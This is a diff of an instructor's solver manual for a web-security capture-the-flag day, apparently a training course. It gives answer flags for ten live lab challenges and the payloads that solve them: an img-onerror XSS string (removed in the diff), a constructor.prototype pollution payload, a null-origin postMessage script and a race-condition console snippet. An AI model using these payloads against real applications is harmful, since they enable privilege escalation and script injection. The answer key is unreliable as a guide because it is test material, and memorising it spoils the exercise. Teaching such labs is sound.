@@ -1,28 +1,23 @@
-# Day 7 — Web Applications: Admin Solver Manual (v2)
+# Day 7 — Web Applications: Admin Solver Manual (v2.1)
 
 > **Instructor use only.** Expected recoveries for the live Day 7 pack.
 
-## Why v2 exists
+## Why v2.1
 
-v1 was fifteen `.txt` downloads (logic puzzles + “web” transcripts). Students
-could paste every file into a chatbot and clear the board without opening a
-browser. That fails the course goal.
-
-v2 is **ten live pages** — cookies, DOM, storage, network, frames, a weak sink,
-and a three-lock finale. **No downloadable artifacts.** Medium+ answers are
-gated by browser state and/or `live_material` (never sitting as plaintext in the
-JS bundle for the hard path).
-
-**One test solve on old `d7_vm` (TEST_USER) was wiped** when v2 replaced Day 7.
+v2’s top tier (Blind Counter / Friendly Sink / Triple Lock) scored like
+Easy–Medium Web (~3–4/10). v2.1 replaces that tier with **three real Danger
+labs**: prototype pollution, null-origin `postMessage`, and a 180ms TOCTOU race.
+Still **zero files**. ChatGPT cannot click the race or invent the sandboxed
+widget without the student doing browser work.
 
 ## Pack summary
 
 | | |
 |--|--|
-| Count | **10** — 3 easy · 4 medium · 2 hard · 1 danger |
+| Count | **10** — 3 easy · 4 medium · **3 danger** |
 | Day code | `WEB-2026` |
-| Files | **None** (`asset_url` is null on every row) |
-| Flag model | All `is_dynamic` → personal `KGSP{…}` via `verify_challenge_answer` |
+| Files | **None** |
+| Flag model | All `is_dynamic` |
 
 ## Answer map
 
@@ -35,84 +30,73 @@ JS bundle for the hard path).
 | 5 | `d7_twin_check` | Twin Check | Medium | `/challenge/twin-check` | `both_match` |
 | 6 | `d7_frame_whisper` | Frame Whisper | Medium | `/challenge/frame-whisper` | `posted_secret` |
 | 7 | `d7_stash_order` | Stash Order | Medium | `/challenge/stash-order` | `abc_order` |
-| 8 | `d7_blind_counter` | Blind Counter | Hard | `/challenge/blind-counter` | `gate_7k2` |
-| 9 | `d7_friendly_sink` | Friendly Sink | Hard | `/challenge/friendly-sink` | `vault_spill` |
-| 10 | `d7_triple_lock` | Triple Lock | Danger | `/challenge/triple-lock` | `all_three_open` |
+| 8 | `d7_inherited_trust` | Inherited Trust | Danger | `/challenge/inherited-trust` | `chief_clearance` |
+| 9 | `d7_cross_talk` | Cross Talk | Danger | `/challenge/cross-talk` | `null_origin_ok` |
+| 10 | `d7_flash_seat` | Flash Seat | Danger | `/challenge/flash-seat` | `race_won` |
 
 ---
 
-## 1 · Markup Trail (easy)
+## 1–7 · Easy / Medium
 
-Open the live page. In the Elements tree:
+Unchanged from v2 — see previous sections in git history if needed. Short form:
 
-- `data-k="ink"`
-- `data-k="_bel"`
-- HTML comment `ow`
+1. Markup Trail → `ink` + `_bel` + comment `ow` → **`ink_below`**
+2. Side Door → visit lobby then `/challenge/side-door/hatch` → **`service_hatch`**
+3. Desk Wizard → walk / quiet / none → `sessionStorage d7_desk_recovery` → **`quiet_path`**
+4. Role Chip → cookie `d7_role` JSON `role` → `analyst` → **`analyst_seat`**
+5. Twin Check → mirror cookie `d7_pair` into the form → **`both_match`**
+6. Frame Whisper → catch iframe `postMessage` → **`posted_secret`**
+7. Stash Order → Network drawers `alpha/beta/gamma` into `d7_stash_a/b/c` → **`abc_order`**
 
-Concatenate → **`ink_below`**.
+---
 
-## 2 · Side Door (easy)
+## 8 · Inherited Trust (danger) — prototype pollution
 
-Open `/challenge/side-door` (sets visit cookie). Navigate to
-**`/challenge/side-door/hatch`**. Page shows **`service_hatch`**.
+Merge blocks only the literal key `__proto__`. Payload:
 
-## 3 · Desk Wizard (easy)
+```json
+{"constructor":{"prototype":{"deskRole":"chief"}}}
+```
 
-Choose: **Walk-in** → **Quiet-room access** → **Nobody — keep it internal**.
-Then read `sessionStorage` key `d7_desk_recovery` (base64) → **`quiet_path`**.
+Merge settings → **`chief_clearance`**.
 
-## 4 · Role Chip (medium)
+## 9 · Cross Talk (danger) — null-origin postMessage
 
-Cookie `d7_role` is base64 JSON with `role: guest`. Change `role` to
-**`analyst`**, write the cookie back. Page decrypts → **`analyst_seat`**.
+Page rejects any elevate whose `event.origin` is not the string `"null"` /
+empty. Load this as the sandboxed widget (sandbox is already `allow-scripts`
+only — no `allow-same-origin`):
 
-## 5 · Twin Check (medium)
+```html
+<script>parent.postMessage({elevate:true}, '*')</script>
+```
 
-Cookie `d7_pair` holds a random hex twin. Paste the same value into the form,
-click Check twins → **`both_match`**.
+→ **`null_origin_ok`**.
 
-## 6 · Frame Whisper (medium)
+## 10 · Flash Seat (danger) — 180ms TOCTOU
 
-Open DevTools console, listen for `message` events (or catch the iframe’s
-`postMessage`). Note payload → **`posted_secret`**.
+1. Ensure `localStorage.d7_flash_role === 'guest'` (default).
+2. In one burst (console or snippet), within **180ms**:
+   - click Reserve (while guest)
+   - set `localStorage.d7_flash_role = 'admin'`
+   - click Confirm
 
-## 7 · Stash Order (medium)
+Example console helper:
 
-Click **Request floor plan**. Network → `/collect/desk-drawers` — order by
-`seq`, read `seg`: `alpha`, `beta`, `gamma`. Set lasting storage:
+```js
+document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Reserve')) b.click(); });
+localStorage.setItem('d7_flash_role', 'admin');
+document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Confirm')) b.click(); });
+```
 
-- `d7_stash_a` = `alpha`
-- `d7_stash_b` = `beta`
-- `d7_stash_c` = `gamma`
+→ **`race_won`**.
 
-Open vault → **`abc_order`**.
-
-## 8 · Blind Counter (hard)
-
-Eight positions. Probe glyph-by-glyph with the Ask UI until each seat shows
-YES. Rebuild → **`gate_7k2`**.
-
-## 9 · Friendly Sink (hard)
-
-Filter strips `script` / `javascript:` only. Inject e.g.
-`<img src=x onerror="document.body.append(window.__D7_VAULT)">` (any equivalent
-sink). Vault value → **`vault_spill`**.
-
-## 10 · Triple Lock (danger)
-
-1. **Stamp visit** → cookie `d7_lock_c=hatch`
-2. **Ping desk** → Network `/collect/desk-ping` → `seg=ping` (type `ping` into
-   the middle field)
-3. **Stash mark** → `localStorage d7_lock_s=lock`
-
-Open triple lock → **`all_three_open`**.
+Setting admin *before* Reserve fails (snapshot must be guest).
 
 ---
 
 ## Instructor notes
 
-- Day stays **locked + code-gated** until you open it (`WEB-2026`).
-- Regenerating `challenge_answer_keys.secret` would invalidate personal flags —
-  do not touch secrets after players have solved.
-- Hints are vague on purpose. Do not strengthen them mid-event.
-- Frontend routes live under `src/pages/day7/` + `App.tsx`.
+- Day code: `WEB-2026`.
+- Do not strengthen hints mid-event.
+- Routes: `src/pages/day7/` + `App.tsx`.
+- Migration: `supabase/migrations/20260712_2230_day7_three_real_dangers.sql`.
